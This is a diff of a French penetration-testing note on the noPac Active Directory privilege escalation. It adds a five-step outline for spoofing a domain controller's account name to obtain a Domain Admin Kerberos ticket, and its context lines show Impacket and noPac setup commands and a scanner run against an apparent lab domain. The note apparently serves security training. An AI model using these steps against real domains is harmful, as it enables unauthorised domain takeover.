@@ -19,11 +19,24 @@ En combinant ces deux failles, un attaquant peut escalader ses privilèges d'un 
 2. **Obtention d'un Ticket Kerberos** : En demandant un Ticket-Granting Service (TGS), le service d'authentification Kerberos émet un ticket en fonction du nom le plus proche, accordant ainsi des privilèges élevés.
 3. **Exploitation finale** : Une fois en possession d'un ticket Kerberos, l'attaquant obtient un accès administrateur sur le DC et peut exécuter des commandes système.
 
+{% code overflow="wrap" %}
+```
+Étape 1 : Crée un compte machine  →  FAKE$
+Étape 2 : Renomme-le en           →  DC01  (copie le nom du vrai DC)
+Étape 3 : Obtiens un TGT au nom de DC01
+Étape 4 : Renomme le compte vers autre chose (DC01 n'existe plus)
+Étape 5 : Demande un TGS avec ce TGT
+          → KDC cherche DC01, introuvable
+          → KDC trouve DC01$ = le vrai DC
+          → Tu reçois un ticket avec droits Domain Admin ✓
+```
+{% endcode %}
+
 ***
 
 <mark style="color:green;">**Exploitation avec Impacket et NoPac**</mark>
 
-#### <mark style="color:orange;">**Installation des outils**</mark>
+<mark style="color:orange;">**Installation des outils**</mark>
 
 ```bash
 # Cloner et installer Impacket
@@ -34,7 +47,7 @@ $ cd impacket && python setup.py install
 $ git clone https://github.com/Ridter/noPac.git
 ```
 
-#### <mark style="color:orange;">**Vérification de la vulnérabilité**</mark>
+<mark style="color:orange;">**Vérification de la vulnérabilité**</mark>
 
 {% code overflow="wrap" fullWidth="true" %}
 ```bash
@@ -42,7 +55,7 @@ $ sudo python3 scanner.py inlanefreight.local/user:password -dc-ip 172.16.5.5 -u
 ```
 {% endcode %}
 
-#### <mark style="color:orange;">**Exploitation pour obtenir un shell SYSTEM**</mark>
+<mark style="color:orange;">**Exploitation pour obtenir un shell SYSTEM**</mark>
 
 {% code fullWidth="true" %}
 ```bash
